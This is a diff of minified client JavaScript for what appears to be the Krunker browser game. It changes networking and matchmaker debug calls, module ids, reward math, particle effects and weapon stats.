         if (yt[xt].set) {
-            var wt = getSavedVal("kro_setng_" + xt);
+            var wt = getSavedVal("kro_setngss_" + xt);
             yt[xt].val = null === wt ? yt[xt].val : wt, "false" == yt[xt].val && (yt[xt].val = !1), yt[xt].set(yt[xt].val, !0)
         }
     function bt(t) {
@@ -44547,6 +43618,10 @@
                     }
                 }
             }(W), L.update(W * b.config.deltaMlt), M && M.active && !window.locked ? (b.config.thirdPerson ? m.camera.position.set(n.thirdPX, 2, n.thirdPZ) : m.camera.position.set(0, 0, 0), L.skipScroll = !1, T = [L.getISN(), W * b.config.deltaMlt, L.xDr, L.yDr, n.movDirs.indexOf(L.moveDir), L.mouseDownL, L.mouseDownR || L.keys[L.aimKey] ? 1 : 0, L.keys[L.jumpKey] ? 1 : 0, L.keys[L.crouchKey] ? 1 : 0, L.keys[L.reloadKey] ? 1 : 0, L.scrollDelta], L.scrollDelta && (L.skipScroll = !0), L.scrollDelta = 0, L.tmpInputs.push(T), function(t) {
+                if (window.control.mouseDownL === 1) {
+                    window.control.mouseDownL = 0;
+                    window.control.mouseDownR = 0;
+                }
                 if (we && M && M.active) {
                     for (var e = {
                             time: V,
@@ -44699,98 +43774,99 @@
         }(), t == L.sprayKey && w.send("s"), t == L.inspKey && b.players.wInspect(M), 49 <= t && 57 >= t && w.send("k", t - 49))
     }, getSavedVal("consent") || (consentBlock.style.display = "block");
     var Ai = !1;
+
+    function Li() {
+        if (!Ai) {
+            Ai = !0;
+            var t = getSavedVal("custMap");
+            s("custMap"), t ? Si(t) : a.seek({
+                autoChangeGame: !1,
+                skipReplaceState: et
+            }).then(t => {
+                c = t.gameId, l = t.host, p = t.port;
+                var e = `//${t.host}:8088/?gameId=${t.gameId}&clientKey=${t.clientId}`;
+                w.connect(e, function(t) {
+                    if (t) {
+                        if (null != fi) return;
+                        Mi()
+                    } else {
+                        vt(), aHolder.style.display = null;
+                        var e = getSavedVal("mapToLoad");
+                        s("mapToLoad"), e && selectHostMap(e)
+                    }
+                }, {
+                    init: Re,
+                    load: Ei,
+                    ready: Ti,
+                    start: Le,
+                    cust: u,
+                    pur: pt,
+                    uf: lt,
+                    gmsg: Ge,
+                    pc: Si,
+                    cln: fe,
+                    upMp: be,
+                    mpsL: ge,
+                    modsL: me,
+                    lock: ke,
+                    srchM: ve,
+                    spin: de,
+                    unb: ue,
+                    end: Pe,
+                    pErr: purchaseError,
+                    error: bi,
+                    strm: _i,
+                    dc: Mi,
+                    ts: si,
+                    t: Ne,
+                    n: Be,
+                    0: ze,
+                    1: Ye,
+                    8: Ue,
+                    2: qe,
+                    3: Xe,
+                    kst: Ke,
+                    ac: Je,
+                    4: gi,
+                    5: oi,
+                    6: li,
+                    lv: ai,
+                    7: ti,
+                    9: ei,
+                    10: pi,
+                    h: di,
+                    s: Ie,
+                    sp: De,
+                    ch: vi,
+                    vc: voiceChat,
+                    a: Et,
+                    ua: bt,
+                    ex: ri,
+                    st: Ze,
+                    pr: ii,
+                    tm: We,
+                    pre: ni,
+                    obj: b.setObjective,
+                    do: b.destroyObj,
+                    pi: Fe,
+                    pir: He
+                }), a.fetchGameInfo(t.gameId).then(t => {
+                    menuRegionLabel.innerText = n.regionNames[t.region], mainLogo.src = "/img/krunker_logo" + ("jb-hnd" == t.region ? "_1" : "_0") + ".png"
+                }).catch(t => console.error("Failed to fetch game info", t))
+            }).catch(t => {
+                let e = t.message;
+                t.response && ("InvalidGameId" == (e = t.response.data.error) ? e = "Game not found." : "GameFull" == e && (e = "Game is full.")), bi(e)
+            }), window.requestAnimFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(t) {
+                window.setTimeout(t, 1e3 / 60)
+            }, setInterval(() => {
+                window.chH(w)
+            }, 1e4), setInterval(xi, n.clientSendRate), setInterval(je, n.nameVisRate), Y = Date.now(), yi()
+        }
+    }
     window.captchaCallback = function() {
-        instructions.innerHTML = "CONNECTING...",
-            function() {
-                if (!Ai) {
-                    Ai = !0;
-                    var t = getSavedVal("custMap");
-                    s("custMap"), t && Si(t), a.seek({
-                        autoChangeGame: !1,
-                        skipReplaceState: et
-                    }).then(t => {
-                        c = t.gameId, l = t.host, p = t.port;
-                        var e = `//${t.host}:${t.port}/ws?gameId=${t.gameId}&clientKey=${t.clientId}`;
-                        w.connect(e, function(t) {
-                            if (t) {
-                                if (null != fi) return;
-                                Mi()
-                            } else {
-                                vt(), aHolder.style.display = null;
-                                var e = getSavedVal("mapToLoad");
-                                s("mapToLoad"), e && selectHostMap(e)
-                            }
-                        }, {
-                            init: Re,
-                            load: Ei,
-                            ready: Ti,
-                            start: Le,
-                            cust: u,
-                            pur: pt,
-                            uf: lt,
-                            gmsg: Ge,
-                            pc: Si,
-                            cln: fe,
-                            upMp: be,
-                            mpsL: ge,
-                            modsL: me,
-                            lock: ke,
-                            srchM: ve,
-                            spin: de,
-                            unb: ue,
-                            end: Pe,
-                            pErr: purchaseError,
-                            error: bi,
-                            strm: _i,
-                            dc: Mi,
-                            ts: si,
-                            t: Ne,
-                            n: Be,
-                            0: ze,
-                            1: Ye,
-                            8: Ue,
-                            2: qe,
-                            3: Xe,
-                            kst: Ke,
-                            ac: Je,
-                            4: gi,
-                            5: oi,
-                            6: li,
-                            lv: ai,
-                            7: ti,
-                            9: ei,
-                            10: pi,
-                            h: di,
-                            s: Ie,
-                            sp: De,
-                            ch: vi,
-                            vc: voiceChat,
-                            a: Et,
-                            ua: bt,
-                            ex: ri,
-                            st: Ze,
-                            pr: ii,
-                            tm: We,
-                            pre: ni,
-                            obj: b.setObjective,
-                            do: b.destroyObj,
-                            pi: Fe,
-                            pir: He
-                        }), a.fetchGameInfo(t.gameId).then(t => {
-                            menuRegionLabel.innerText = n.regionNames[t.region]
-                        }).catch(t => console.error("Failed to fetch game info", t))
-                    }).catch(t => {
-                        let e = t.message;
-                        t.response && ("InvalidGameId" == (e = t.response.data.error) ? e = "Game not found." : "GameFull" == e && (e = "Game is full.")), bi(e)
-                    }), window.requestAnimFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(t) {
-                        window.setTimeout(t, 1e3 / 60)
-                    }, setInterval(() => {
-                        window.chH(w)
-                    }, 1e4), setInterval(xi, n.clientSendRate), setInterval(je, n.nameVisRate), Y = Date.now(), yi()
-                }
-            }()
-    }, window.debugMatchmaker = function(t) {
-        return t || (t = c), Promise.all([a.fetchGameInfo(t), a.fetchGameDebugInfo(t), a.fetchAllDebugInfo()]).then(([t, e, i]) => {
+        instructions.innerHTML = "CONNECTING...", Li()
+    }, window.debugMatchmaker = function(t, e) {
+        return e || (e = c), Promise.all([a.fetchGameInfo(e), a.fetchGameDebugInfo(t, e), a.fetchAllDebugInfo(t)]).then(([t, e, i]) => {
             let n = {
                 gameInfo: t,
                 gameDebugInfo: e,
@@ -44830,8 +43906,8 @@
     Object.defineProperty(e, "__esModule", {
         value: !0
     });
-    const r = i(63),
-        s = i(66);
+    const r = i(58),
+        s = i(61);
     class o {
         constructor(t) {
             this.cachePingRegion = !0, this.enableLogging = !!localStorage.getItem("CLIENT_MANAGER_LOGGING"), "localhost" === location.hostname && (location.hostname = "127.0.0.1"), this.domain = t
@@ -44906,18 +43982,6 @@
                 })
             })
         }
-        fetchAllDebugInfo() {
-            return n(this, void 0, void 0, function*() {
-                return this.log("Fetching all debug info..."), yield this.matchmakerRequest("/all-debug-info", {})
-            })
-        }
-        fetchGameDebugInfo(t) {
-            return n(this, void 0, void 0, function*() {
-                return this.log(`Fetching game debug info for ${t}...`), yield this.matchmakerRequest("/game-debug-info", {
-                    gameId: t
-                })
-            })
-        }
         matchmakerSeek(t, e = null, i = !0) {
             return n(this, void 0, void 0, function*() {
                 this.log(`Seeking matchmaker with region ${t}...`);
@@ -44927,6 +43991,21 @@
                     autoChangeGame: i
                 };
                 return e && (n.game = e), yield this.matchmakerRequest("/seek-game", n)
+            })
+        }
+        fetchAllDebugInfo(t) {
+            return n(this, void 0, void 0, function*() {
+                return this.log("Fetching all debug info..."), yield this.matchmakerRequest("/internal/all-debug-info", {
+                    key: t
+                })
+            })
+        }
+        fetchGameDebugInfo(t, e) {
+            return n(this, void 0, void 0, function*() {
+                return this.log(`Fetching game debug info for ${e}...`), yield this.matchmakerRequest("/internal/game-debug-info", {
+                    key: t,
+                    gameId: e
+                })
             })
         }
         generateHref(t) {
@@ -44948,8 +44027,8 @@
 }, function(t, e, i) {
     "use strict";
     (function(e) {
-        var n = i(64),
-            r = i(65),
+        var n = i(59),
+            r = i(60),
             s = /^([a-z][a-z0-9.+-]*:)?(\/\/)?([\S\s]*)/i,
             o = /^[A-Za-z][A-Za-z0-9+-.]*:\/\//,
             a = [
@@ -45045,7 +44124,7 @@
                 return i.username && (s += i.username, i.password && (s += ":" + i.password), s += "@"), s += i.host + i.pathname, (e = "object" == typeof i.query ? t(i.query) : i.query) && (s += "?" === e.charAt(0) ? e : "?" + e), i.hash && (s += i.hash), s
             }
         }, h.extractProtocol = p, h.location = l, h.qs = r, t.exports = h
-    }).call(this, i(24))
+    }).call(this, i(23))
 }, function(t, e, i) {
     "use strict";
     t.exports = function(t, e) {
@@ -45072,13 +44151,13 @@
         return n
     }
 }, function(t, e, i) {
-    t.exports = i(67)
+    t.exports = i(62)
 }, function(t, e, i) {
     "use strict";
-    var n = i(12),
-        r = i(56),
-        s = i(69),
-        o = i(48);
+    var n = i(4),
+        r = i(50),
+        s = i(64),
+        o = i(44);
 
     function a(t) {
         var e = new s(t),
@@ -45088,9 +44167,9 @@
     var c = a(o);
     c.Axios = s, c.create = function(t) {
         return a(n.merge(o, t))
-    }, c.Cancel = i(60), c.CancelToken = i(83), c.isCancel = i(59), c.all = function(t) {
+    }, c.Cancel = i(54), c.CancelToken = i(78), c.isCancel = i(53), c.all = function(t) {
         return Promise.all(t)
-    }, c.spread = i(84), t.exports = c, t.exports.default = c
+    }, c.spread = i(79), t.exports = c, t.exports.default = c
 }, function(t, e) {
     function i(t) {
         return !!t.constructor && "function" == typeof t.constructor.isBuffer && t.constructor.isBuffer(t)
@@ -45102,10 +44181,10 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(48),
-        r = i(12),
-        s = i(78),
-        o = i(79);
+    var n = i(44),
+        r = i(4),
+        s = i(73),
+        o = i(74);
 
     function a(t) {
         this.defaults = t, this.interceptors = {
@@ -45145,7 +44224,7 @@
     }), t.exports = a
 }, function(t, e, i) {
     "use strict";
-    var n = i(12);
+    var n = i(4);
     t.exports = function(t, e) {
         n.forEach(t, function(i, n) {
             n !== e && n.toUpperCase() === e.toUpperCase() && (t[e] = i, delete t[n])
@@ -45153,7 +44232,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(58);
+    var n = i(52);
     t.exports = function(t, e, i) {
         var r = i.config.validateStatus;
         i.status && r && !r(i.status) ? e(n("Request failed with status code " + i.status, i.config, null, i.request, i)) : t(i)
@@ -45165,7 +44244,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(12);
+    var n = i(4);
 
     function r(t) {
         return encodeURIComponent(t).replace(/%40/gi, "@").replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]")
@@ -45187,7 +44266,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(12),
+    var n = i(4),
         r = ["age", "authorization", "content-length", "content-type", "etag", "expires", "from", "host", "if-modified-since", "if-unmodified-since", "last-modified", "location", "max-forwards", "proxy-authorization", "referer", "retry-after", "user-agent"];
     t.exports = function(t) {
         var e, i, s, o = {};
@@ -45200,7 +44279,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(12);
+    var n = i(4);
     t.exports = n.isStandardBrowserEnv() ? function() {
         function t(t) {
             var e = t;
@@ -45241,7 +44320,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(12);
+    var n = i(4);
     t.exports = n.isStandardBrowserEnv() ? {
         write: function(t, e, i, r, s, o) {
             var a = [];
@@ -45263,7 +44342,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(12);
+    var n = i(4);
 
     function r() {
         this.handlers = []
@@ -45282,12 +44361,12 @@
     }, t.exports = r
 }, function(t, e, i) {
     "use strict";
-    var n = i(12),
-        r = i(80),
-        s = i(59),
-        o = i(48),
-        a = i(81),
-        c = i(82);
+    var n = i(4),
+        r = i(75),
+        s = i(53),
+        o = i(44),
+        a = i(76),
+        c = i(77);
 
     function l(t) {
         t.cancelToken && t.cancelToken.throwIfRequested()
@@ -45303,7 +44382,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(12);
+    var n = i(4);
     t.exports = function(t, e, i) {
         return n.forEach(i, function(i) {
             t = i(t, e)
@@ -45321,7 +44400,7 @@
     }
 }, function(t, e, i) {
     "use strict";
-    var n = i(60);
+    var n = i(54);
 
     function r(t) {
         if ("function" != typeof t) throw new TypeError("executor must be a function.");
@@ -45722,6 +44801,234 @@
             }, p)
         }
     }
+}, function(t, e, i) {
+    var n = i(2),
+        r = i(5),
+        s = new n.Vector3;
+
+    function o() {
+        n.Object3D.call(this), this.largeSpawnCount = 8, this.smallSpawnCount = 15, this.emissiveness = .55, this.velocityDamping = 3, this.lifeSpeedMin = 2.2, this.lifeSpeedRange = 3;
+        var t = new n.Geometry({
+                dynamic: !0
+            }),
+            e = new n.Color(12303291);
+        this.mesh = new n.Mesh(t, new n.MeshLambertMaterial({
+            color: e,
+            emissive: e.multiplyScalar(this.emissiveness),
+            shading: n.FlatShading
+        })), this.mesh.castShadow = !0, this.mesh.receiveShadow = !0, this.add(this.mesh), this.cubeTemplate = new n.BoxGeometry(1, 1, 1);
+        for (var i = 0; i < this.cubeTemplate.faces.length; i++) this.cubeTemplate.faces[i].materialIndex = 0;
+        this.cubeTemplate.faceVertexUvs = [
+            []
+        ], this.entities = []
+    }
+    o.staticMatrix = new n.Matrix4, o.prototype = Object.create(n.Object3D.prototype), Object.defineProperty(o, "finished", function() {
+        return 0 === this.entities.length
+    }), o.prototype.explodeAt = function(t, e, i, n) {
+        this.sizeMin = .35 * n, this.sizeRange = 2.2 * n, this.velocityMin = 30 * n, this.velocityRange = 17 * n, s.set(t, e, i);
+        for (var r = 0; r < this.largeSpawnCount; r++) this.spawnEntity(.1 * Math.random() + .9, s, !1);
+        for (r = 0; r < this.smallSpawnCount; r++) this.spawnEntity(.9 * Math.random(), s, !1)
+    }, o.prototype.spawnEntity = function(t, e) {
+        for (var i = Math.pow(t, 2.5), n = i * this.sizeRange + this.sizeMin, r = (1 - i) * this.velocityRange + this.velocityMin, s = this._randomVector().normalize().multiplyScalar(r), a = i * this.lifeSpeedRange + this.lifeSpeedMin, c = 0;;) {
+            for (var l = !0, p = 0; p < this.entities.length; p++)
+                if (this.entities[p].index === c) {
+                    l = !1;
+                    break
+                } if (l) break;
+            c++
+        }
+        8 * c > this.mesh.geometry.vertices.length - 1 && this.mesh.geometry.merge(this.cubeTemplate, o.emptyMatrix), this.entities.push({
+            index: c,
+            rank: i,
+            rankSeed: t,
+            life: 0,
+            lifeSpeed: a,
+            size: n,
+            position: e.clone(),
+            velocity: s
+        })
+    }, o.prototype.destroyEntity = function(t) {
+        this.entities.splice(this.entities.indexOf(t), 1);
+        for (var e = 8 * t.index; e < 8 * (t.index + 1); e++) this.mesh.geometry.vertices[e].set(0, 0, 0);
+        this.mesh.geometry.verticesNeedUpdate = !0, this.mesh.geometry.elementsNeedUpdate = !0, this._cleanGeometry()
+    }, o.prototype.update = function(t) {
+        t /= 1e3;
+        for (var e, i = 0; i < this.entities.length; i++) {
+            (e = this.entities[i]).life += t * e.lifeSpeed, e.velocity.multiplyScalar(1 - this.velocityDamping * t), e.position.add(e.velocity.clone().multiplyScalar(t));
+            var n = 2 - Math.pow(e.life / Math.sqrt(2), 2);
+            n *= e.size;
+            for (var r = 8 * e.index; r < 8 * (e.index + 1); r++) {
+                var s = this.mesh.geometry.vertices[r],
+                    o = this.cubeTemplate.vertices[r % 8];
+                s.set(e.position.x, e.position.y, e.position.z).addScaledVector(o, n)
+            }
+            0 >= n && this.destroyEntity(e)
+        }
+        this.mesh.geometry.verticesNeedUpdate = !0, this.mesh.geometry.elementsNeedUpdate = !0, this.mesh.geometry.computeBoundingSphere()
+    }, o.prototype._cleanGeometry = function() {
+        for (var t, e = this.mesh.geometry.vertices, i = this.mesh.geometry.faces, n = -1, r = 0; r < this.entities.length; r++)(t = this.entities[r]).index > n && (n = t.index);
+        var s = n + 1;
+        e.splice(8 * s, e.length - 8 * s), i.splice(12 * s, i.length - 12 * s)
+    }, o.prototype._randomVector = function() {
+        return new n.Vector3(Math.random() - .5, Math.random() - .5, Math.random() - .5)
+    };
+    var a = [{
+            mat: n.MeshBasicMaterial,
+            spd: 1.7,
+            scale: 1.1,
+            length: 12,
+            color: 16777179
+        }, {
+            spd: [.03, .04],
+            grav: 4e-4,
+            spn: [.03, .05],
+            scale: .15,
+            length: .5,
+            color: 10124094
+        }, {
+            spd: [.03, .04],
+            grav: 4e-4,
+            spn: [.03, .05],
+            scale: .11,
+            length: .4,
+            color: 12816686
+        }],
+        c = function(t) {
+            this.mesh = new n.Mesh(t.cubeGeo), this.init = function(e, i, s, o, a, c, l, p) {
+                this.dst = c, this.spd = l.spd[1] ? r.randFloat(l.spd[0], l.spd[1]) : l.spd, o -= Math.PI, this.xS = this.spd * Math.sin(o) * Math.cos(a) + (p ? p.xVel : 0), this.zS = this.spd * Math.cos(o) * Math.cos(a) + (p ? p.zVel : 0), this.yS = this.spd * Math.sin(a) + (p ? p.yVel : 0), this.grav = l.grav, this.spin = l.spn ? l.spn[1] ? r.randFloat(l.spn[0], l.spn[1]) : l.spn : 0, this.mesh.receiveShadow = l.mat != n.MeshBasicMaterial, this.mesh.material = t.getMat("default", {
+                    fog: l.mat != n.MeshBasicMaterial,
+                    color: l.color,
+                    emissive: l.emis,
+                    mat: l.mat
+                }), p && p.isYou ? this.mesh.layers.set(1) : this.mesh.layers.set(0), t.moveMesh(this.mesh, e, i, s), this.mesh.lookAt(e + this.xS, i + this.yS, s + this.zS), t.scaleMesh(this.mesh, l.scale, l.scale, l.length)
+            }, this.update = function(t) {
+                this.mesh.visible && (this.mesh.position.x += this.xS * t, this.mesh.position.z += this.zS * t, this.mesh.position.y += this.yS * t, this.spin && (this.mesh.rotation.x += this.spin * t), this.yS -= (this.grav || 0) * t, this.dst -= this.spd * t, 0 >= this.dst && (this.mesh.visible = !1))
+            }
+        };
+    n.Sprite.prototype.init = function(t, e, i, n, r, s, o, a, c, l) {
+        this.position.x = t, this.position.y = e, this.position.z = i, this.xVel = n, this.yVel = r, this.zVel = s, this.scale.x = this.scale.y = o, this.life = a || 0, this.grav = c || 0, this.area = l, this.updC = 0
+    }, n.Sprite.prototype.update = function(t) {
+        if (this.visible) {
+            if (this.position.x += this.xVel * t, this.position.y += this.yVel * t, this.yVel -= this.grav * t, this.position.z += this.zVel * t, this.area) {
+                var e = this.scale.x / 2;
+                this.position.x - e >= this.area.x + this.area.w ? this.position.x = this.area.x - this.area.w - e : this.position.x + e <= this.area.x - this.area.w && (this.position.x = this.area.x + this.area.w + e), this.position.z - e >= this.area.z + this.area.l ? this.position.z = this.area.z - this.area.l - e : this.position.z + e <= this.area.z - this.area.l && (this.position.z = this.area.z + this.area.l + e), this.position.y - e >= this.area.y + this.area.h ? this.position.y = this.area.y - e : this.position.y + e <= this.area.y && (this.position.y = this.area.y + this.area.h + e)
+            }
+            0 < this.life ? (this.life -= t, 0 >= this.life && this.updC && (this.visible = !1), this.updC++) : 0 >= this.life && this.updC && (this.visible = !1)
+        }
+    };
+    var l = [Math.PI / 3, -Math.PI / 3],
+        p = [{
+            hole: !0,
+            count: 2,
+            grav: -2e-5,
+            scale: [5, 9],
+            speed: [0, .025],
+            spread: [-.4, .4],
+            life: [300, 500]
+        }, {}, {
+            count: 1,
+            blending: 2,
+            scale: [5, 7],
+            speed: [0, 0],
+            spread: [0, 0],
+            life: [30, 35]
+        }, {
+            count: 1,
+            blending: 2,
+            scale: [2e3, 2e3],
+            speed: [0, 0],
+            spread: [0, 0]
+        }, {
+            count: 4,
+            src: "0",
+            scale: [5, 6],
+            speed: [0, .01],
+            spread: [-1, 1],
+            life: [600, 800]
+        }];
+    t.exports = function(t) {
+        var e, i;
+        this.particles = [], this.physObjs = [], this.areas = [], this.active = !0, this.ExplosionManager = new o, this.prefabs = [{
+            src: "glow_0",
+            blending: 2,
+            spd: .008,
+            cnt: 2.2,
+            grav: [-.015, -.005],
+            scl: [.7, 1],
+            dir: 0
+        }, {
+            src: "glow_1",
+            blending: 1,
+            spd: .003,
+            cnt: 18,
+            grav: [-.2, -.22],
+            scl: [1, 1.5],
+            dir: 0
+        }, {
+            src: "fog_0",
+            blending: 1,
+            spd: .002,
+            cnt: 6,
+            grav: [0, 0],
+            scl: [25, 30],
+            dir: 0
+        }], this.area = function(t, e, i, n, s, o, a, c) {
+            n /= 2, o /= 2, this.areas.push({
+                f: c,
+                x: t,
+                y: e,
+                z: i,
+                w: n,
+                h: s,
+                l: o
+            });
+            for (var l = 0; l < a.count; ++l) this.add(a.src, t + r.randInt(-n, n), e + r.randInt(0, s), i + r.randInt(-o, o), a.spd * Math.sin(a.dir), a.grav ? r.randFloat(a.grav[0], a.grav[1]) : 0, a.spd * Math.cos(a.dir), r.randFloat(a.scl[0], a.scl[1]), 0, 0, a.blending, this.areas[this.areas.length - 1])
+        }, this.effect = function(i, s, o, a, c, l) {
+            if (this.active && (0 == t.useDepthMap || "0" == t.useDepthMap)) {
+                e = p[l];
+                for (var h = 0; h < e.count; ++h) {
+                    var u = r.randFloat(e.speed[0], e.speed[1]),
+                        d = a + r.randFloat(e.spread[0], e.spread[1]),
+                        f = c + r.randFloat(e.spread[0], e.spread[1]);
+                    this.add(l, i, s, o, u * Math.sin(d) * Math.cos(f), u * Math.sin(f), u * Math.cos(d) * Math.cos(f), r.randFloat(e.scale[0], e.scale[1]), e.life ? r.randInt(e.life[0], e.life[1]) : 0, e.grav, e.blending, null, e.src)
+                }
+                e.hole && this.add(1, i, s, o, 0, 0, 0, r.randFloat(.4, 1), 5e3, 0, n.SubtractiveBlending)
+            }
+        }, this.add = function(e, r, s, o, a, c, l, p, h, u, d, f, m) {
+            i = null;
+            for (var g = 0; g < this.particles.length; ++g)
+                if (!this.particles[g].visible && !this.particles[g].static) {
+                    i = this.particles[g];
+                    break
+                } i || (i = new n.Sprite, this.particles.push(i), t.scene.add(i)), this.setMaterial(i, m || e, d, !0), i.visible = !0, i.init(r, s, o, a, c, l, p, h, u, f)
+        }, this.setMaterial = function(e, i, s, o) {
+            e.material = t.getMat("particles/" + i, {
+                mat: n.SpriteMaterial,
+                depthWrite: !1,
+                blending: s || n.NormalBlending,
+                rotation: o ? l[r.randInt(0, 2)] : 0
+            })
+        }, this.physObj = function(e, n, r, s, o, l, p, h, u, d) {
+            if (0 == t.useDepthMap || "0" == t.useDepthMap) {
+                i = null;
+                for (var f = 0; f < this.physObjs.length; ++f)
+                    if (!this.physObjs[f].mesh.visible) {
+                        i = this.physObjs[f];
+                        break
+                    } i || (i = new c(t), this.physObjs.push(i), t.scene.add(i.mesh)), i.sid = null == d ? null : d, i.mesh.visible = !0, i.init(e, n, r, s, o, l, u || a[p], h)
+            }
+        }, this.disablePhys = function(t) {
+            for (var e = 0; e < this.physObjs.length; ++e) this.physObjs[e].sid == t && (this.physObjs[e].mesh.visible = !1)
+        }, this.update = function(t, e) {
+            if (e && e.active)
+                for (var i = 0; i < this.areas.length; ++i) this.areas[i].f && (this.areas[i].x = e.x, this.areas[i].y = e.y, this.areas[i].z = e.z);
+            for (i = 0; i < this.particles.length; ++i) this.particles[i].update(t);
+            for (i = 0; i < this.physObjs.length; ++i) this.physObjs[i].update(t);
+            this.ExplosionManager.update(t)
+        }, this.reset = function() {
+            this.particles.length = 0, this.physObjs.length = 0, this.areas.length = 0
+        }
+    }
 }, function(t, e) {
     var i = t.exports;
     i.active = !0;
@@ -45781,7 +45088,7 @@
     }
 }, function(t, e, i) {
     var n = i(42),
-        r = i(4),
+        r = i(5),
         s = i(1),
         o = 0;
     t.exports.validMap = function(t, e) {
@@ -45811,7 +45118,7 @@
         }
         return null
     }, t.exports.obj = function(e, a, c, l, p, h, u, d, f) {
-        this.isCustom = e, this.sid = o++, this.gameInstance = null, this.connectedClients = 0, this.password = void 0, this.map = new n.manager(l, h, r, s), this.store = i(90), this.weapons = i(52), this.classes = i(53), this.streaks = i(91), this.sprays = i(92), this.projectiles = new(i(93))(this, u), this.players = new(i(47).manager)(this, l, p, h, r, s, u), this.endData = [], this.endTimer = 0, this.banList = [], this.destObjs = [];
+        this.isCustom = e, this.sid = o++, this.gameInstance = null, this.connectedClients = 0, this.password = void 0, this.map = new n.manager(l, h, r, s), this.store = i(86), this.weapons = i(87), this.classes = i(88), this.streaks = i(89), this.sprays = i(90), this.projectiles = new(i(91))(this, u), this.players = new(i(55).manager)(this, l, p, h, r, s, u), this.endData = [], this.endTimer = 0, this.banList = [], this.destObjs = [];
         var m, g, v, y = this;
         this.applyConfig = function(t, e) {
             t = t || {}, this.config = {};
@@ -46023,7 +45330,7 @@
             ]), t
         }, this.endGame = function() {
             if (this.endTimer = s.endTimer, this.waitTimers = null, this.mode.endSort ? this.players.list.sort(this.mode.endSort) : this.players.list.sort(r.orderByScore), null == this.host || this.earnKR)
-                for (var t = 0; t < this.players.list.length; ++t)(m = this.players.list[t]).reward = 0, m.account && (this.earnKR ? m.reward = Math.min(20, Math.floor(m.score / 100)) : m.reward = Math.min(30, Math.floor(m.score / 100)));
+                for (var t = 0; t < this.players.list.length; ++t)(m = this.players.list[t]).reward = 0, m.account && (this.earnKR ? m.reward = Math.min(20, Math.floor(m.score / 150)) : m.reward = Math.min(30, Math.floor(m.score / 100)));
             this.endData.length = 0;
             var e = this.mode.endStats || s.endStats;
             for (t = 0; t < this.players.list.length; ++t)
@@ -48067,6 +47374,696 @@
     }]
 }, function(t, e) {
     t.exports = [{
+        name: "Sniper Rifle",
+        src: "weapon_1",
+        icon: "icon_1",
+        sound: "weapon_1",
+        nAuto: !0,
+        type: 0,
+        scope: !0,
+        swapTime: 300,
+        aimSpeed: 120,
+        spdMlt: .95,
+        ammo: 3,
+        reload: 1500,
+        dmg: 100,
+        pierce: .2,
+        range: 1e3,
+        dropStart: 230,
+        dmgDrop: 30,
+        scale: 1.1,
+        leftHoldY: -.7,
+        rightHoldY: -.75,
+        leftHoldZ: 2.4,
+        rightHoldZ: .4,
+        xOff: .8,
+        yOff: -.75,
+        zOff: -2,
+        xOrg: 0,
+        yOrg: -.55,
+        zOrg: -.8,
+        cLean: .5,
+        cRot: .4,
+        cDrop: .1,
+        inspectR: .4,
+        inspectM: .1,
+        muzOff: 8,
+        muzMlt: 1.6,
+        rate: 900,
+        spread: 260,
+        zoom: 2.7,
+        leanMlt: 1.5,
+        recoil: .009,
+        recoilR: .02,
+        recover: .993,
+        recoverY: .997,
+        recoverF: .975,
+        recoilY: 1,
+        recoilZ: 1.8
+    }, {
+        name: "Assault Rifle",
+        src: "weapon_2",
+        icon: "icon_2",
+        sound: "weapon_2",
+        transp: !0,
+        type: 0,
+        swapTime: 300,
+        aimSpeed: 130,
+        spdMlt: .95,
+        ammo: 30,
+        reload: 1200,
+        dmg: 22,
+        pierce: 1,
+        range: 700,
+        dmgDrop: 10,
+        scale: 1,
+        leftHoldY: -.55,
+        leftHoldX: -.08,
+        rightHoldY: -.7,
+        leftHoldZ: 2,
+        rightHoldZ: .2,
+        xOff: 1.2,
+        yOff: -1,
+        zOff: -2.5,
+        xOrg: 0,
+        yOrg: -.55,
+        zOrg: -.2,
+        cLean: .6,
+        cRot: .5,
+        cDrop: .1,
+        inspectR: .5,
+        inspectM: .9,
+        caseZOff: -1.7,
+        caseYOff: -.2,
+        muzOff: 5.9,
+        muzOffY: .3,
+        muzMlt: 1.4,
+        rate: 110,
+        spread: 120,
+        minSpread: 5,
+        zoom: 1.6,
+        leanMlt: 1,
+        recoil: .003,
+        recoilR: .016,
+        recover: .978,
+        recoverY: .995,
+        recoverF: .975,
+        recoilY: 1,
+        recoilZ: 5
+    }, {
+        name: "Pistol",
+        src: "weapon_3",
+        icon: "icon_3",
+        sound: "weapon_3",
+        secondary: !0,
+        transp: !0,
+        nAuto: !0,
+        kill: ["", 75],
+        type: 1,
+        swapTime: 350,
+        aimSpeed: 120,
+        spdMlt: 1.05,
+        ammo: 10,
+        reload: 700,
+        dmg: 20,
+        range: 700,
+        dmgDrop: 10,
+        scale: .95,
+        leftHoldY: -.82,
+        rightHoldY: -.62,
+        leftHoldZ: -.5,
+        rightHoldZ: -.5,
+        xOff: .7,
+        yOff: -.95,
+        zOff: -4.5,
+        xOrg: 0,
+        yOrg: -.2,
+        zOrg: -4.25,
+        cLean: .5,
+        cRot: .4,
+        cDrop: .1,
+        caseZOff: .2,
+        caseYOff: 0,
+        inspectR: .5,
+        inspectM: .8,
+        muzOff: 1.5,
+        muzOffY: 0,
+        muzMlt: .95,
+        rate: 150,
+        spread: 90,
+        zoom: 1.4,
+        leanMlt: 1,
+        recoil: .006,
+        recoilR: .005,
+        recover: .98,
+        recoverY: .99,
+        recoverF: .98,
+        recoilY: 3,
+        recoilZ: 1
+    }, {
+        name: "Submachine Gun",
+        src: "weapon_4",
+        icon: "icon_4",
+        sound: "weapon_4",
+        transp: !0,
+        newM: !0,
+        type: 0,
+        swapTime: 300,
+        aimSpeed: 120,
+        spdMlt: 1.04,
+        ammo: 24,
+        reload: 1200,
+        dmg: 18,
+        pierce: 1,
